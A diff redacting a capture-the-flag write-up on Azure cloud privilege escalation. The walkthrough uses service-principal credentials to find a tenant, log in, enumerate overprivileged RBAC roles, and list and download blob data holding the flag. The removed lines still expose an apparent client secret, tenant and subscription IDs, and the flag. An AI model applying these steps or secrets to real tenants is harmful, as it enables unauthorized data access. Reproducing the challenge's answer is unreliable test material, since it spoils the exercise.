@@ -53,13 +53,15 @@ I --> J[Retrieve Flag]
 
 ---
 
-# Provided Credentials
+# Initial Access
+
+The following credentials were provided:
 
 | Parameter | Value |
 |---|---|
-| Client ID | `5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f` |
-| Client Secret | `o8g8Q~jZzIZ-eoCgxSC0CDSsdwJ9pjsTRVEIJdsT` |
-| Domain | `secure-corp.org` |
+| Client ID | `<CLIENT_ID>` |
+| Client Secret | `<CLIENT_SECRET>` |
+| Domain | `<DOMAIN_NAME>` |
 
 ---
 
@@ -70,14 +72,14 @@ Azure authentication requires:
 - Client Secret
 - Tenant ID
 
-The Tenant ID was not provided directly, so it must be discovered using the organization domain.
+The Tenant ID was not directly provided and needed to be discovered using the organization domain.
 
 ---
 
 ## Command
 
 ```bash
-curl -s https://login.microsoftonline.com/secure-corp.org/v2.0/.well-known/openid-configuration | jq -r '.token_endpoint'
+curl -s https://login.microsoftonline.com/<DOMAIN_NAME>/v2.0/.well-known/openid-configuration | jq -r '.token_endpoint'
 ```
 
 ---
@@ -93,25 +95,17 @@ curl -s https://login.microsoftonline.com/secure-corp.org/v2.0/.well-known/openi
 
 ---
 
-## Output
+## Example Output
 
 ```text
-https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token
-```
-
----
-
-## Tenant ID Identified
-
-```text
-f2a33211-e46a-4c92-b84d-aff06c2cd13f
+https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/token
 ```
 
 ---
 
 # Step 2 — Authenticate to Azure
 
-Now authenticate using the Service Principal credentials.
+Authenticate using the Service Principal credentials.
 
 ---
 
@@ -119,9 +113,9 @@ Now authenticate using the Service Principal credentials.
 
 ```bash
 az login --service-principal \
--u 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f \
--p 'o8g8Q~jZzIZ-eoCgxSC0CDSsdwJ9pjsTRVEIJdsT' \
---tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+-u <CLIENT_ID> \
+-p '<CLIENT_SECRET>' \
+--tenant <TENANT_ID>
 ```
 
 ---
@@ -138,21 +132,9 @@ az login --service-principal \
 
 ---
 
-## Successful Authentication
-
-The login response confirmed access to:
-
-| Property | Value |
-|---|---|
-| Subscription Name | `Prod` |
-| Subscription ID | `662a4fee-a3ba-49b3-9caf-8c20ed04503f` |
-| Identity Type | `servicePrincipal` |
-
----
-
 # Step 3 — Enumerate RBAC Permissions
 
-After authentication, enumerate Azure RBAC assignments associated with the Service Principal.
+After successful authentication, enumerate RBAC assignments associated with the Service Principal.
 
 ---
 
@@ -160,7 +142,7 @@ After authentication, enumerate Azure RBAC assignments associated with the Servi
 
 ```bash
 az role assignment list \
---assignee 5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f \
+--assignee <CLIENT_ID> \
 --all \
 --output table
 ```
@@ -178,15 +160,15 @@ az role assignment list \
 
 ---
 
-## Output
+## Example Output
 
 ```text
 Principal                             Role                         Scope
 ------------------------------------  ---------------------------  -------------------------------------------------------------------
-5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  Owner                        /subscriptions/.../storageAccounts/secopstestingtoolsacc
-5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  Storage Blob Data Owner      /subscriptions/.../storageAccounts/secopstestingtoolsacc
-5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  Storage Blob Data Reader     /subscriptions/.../storageAccounts/secopstestingtoolsacc
-5ee2cd9a-8ec5-4a06-a543-30ce0fc1585f  secops-testing-mgmt-sp-role  /subscriptions/.../storageAccounts/secopstestingtoolsacc
+<CLIENT_ID>                           Owner                        /subscriptions/.../storageAccounts/<STORAGE_ACCOUNT>
+<CLIENT_ID>                           Storage Blob Data Owner      /subscriptions/.../storageAccounts/<STORAGE_ACCOUNT>
+<CLIENT_ID>                           Storage Blob Data Reader     /subscriptions/.../storageAccounts/<STORAGE_ACCOUNT>
+<CLIENT_ID>                           <CUSTOM_ROLE>                /subscriptions/.../storageAccounts/<STORAGE_ACCOUNT>
 ```
 
 ---
@@ -194,18 +176,17 @@ Principal                             Role                         Scope
 # Security Analysis
 
 The Service Principal possessed excessive privileges, including:
-
 - `Owner`
 - `Storage Blob Data Owner`
-- Custom management role
+- Custom RBAC roles
 
-This level of access enables:
+This level of access enabled:
 - Full storage account administration
 - Blob enumeration
 - Data exfiltration
 - RBAC manipulation
 
-This is a severe Azure IAM misconfiguration.
+This represents a severe Azure IAM misconfiguration.
 
 ---
 
@@ -238,7 +219,7 @@ E --> F[Sensitive Data Exposure]
 
 # Step 4 — Enumerate Azure Storage Containers
 
-Now enumerate containers within the Storage Account.
+Enumerate available blob containers inside the target Storage Account.
 
 ---
 
@@ -246,7 +227,7 @@ Now enumerate containers within the Storage Account.
 
 ```bash
 az storage container list \
---account-name secopstestingtoolsacc \
+--account-name <STORAGE_ACCOUNT> \
 --auth-mode login \
 --output table
 ```
@@ -264,19 +245,19 @@ az storage container list \
 
 ---
 
-## Output
+## Example Output
 
 ```text
 Name
 ----------------------
-secopstestingtoolscont
+<CONTAINER_NAME>
 ```
 
 ---
 
 # Step 5 — Enumerate Blob Files
 
-List all blobs inside the container.
+List all blobs inside the identified container.
 
 ---
 
@@ -284,15 +265,15 @@ List all blobs inside the container.
 
 ```bash
 az storage blob list \
---account-name secopstestingtoolsacc \
---container-name secopstestingtoolscont \
+--account-name <STORAGE_ACCOUNT> \
+--container-name <CONTAINER_NAME> \
 --auth-mode login \
 --output table
 ```
 
 ---
 
-## Output
+## Example Output
 
 ```text
 Name
@@ -312,8 +293,8 @@ Download the suspicious file from Azure Blob Storage.
 
 ```bash
 az storage blob download \
---account-name secopstestingtoolsacc \
---container-name secopstestingtoolscont \
+--account-name <STORAGE_ACCOUNT> \
+--container-name <CONTAINER_NAME> \
 --name test.txt \
 --file test.txt
 ```
@@ -333,7 +314,7 @@ az storage blob download \
 
 # Step 7 — Read the File
 
-Inspect the downloaded file contents.
+Inspect the downloaded blob contents.
 
 ---
 
@@ -345,12 +326,12 @@ cat test.txt
 
 ---
 
-## Output
+## Example Output
 
 ```yaml
 database:
   username: demo_user
-  password: CWL{Privilege_Esc@lati0n_In_Cl0ud_Is_@n_@rt_@nd_Science}
+  password: <FLAG>
 ```
 
 ---
@@ -358,7 +339,7 @@ database:
 # Flag
 
 ```text
-CWL{Privilege_Esc@lati0n_In_Cl0ud_Is_@n_@rt_@nd_Science}
+<FLAG>
 ```
 
 ---
